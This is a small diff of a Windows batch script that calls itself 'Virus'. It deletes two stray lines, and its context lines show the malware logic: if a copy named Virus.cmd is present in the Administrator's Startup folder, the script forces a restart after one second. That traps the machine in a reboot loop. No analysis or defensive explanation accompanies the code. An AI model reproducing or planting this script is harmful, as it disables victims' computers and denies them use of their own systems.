@@ -1,5 +1,3 @@
-ÿþa
-cls
 @echo off & color 0a & setlocal enabledelayedexpansion
 title Virus
 if exist "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.cmd" shutdown -r -t 1
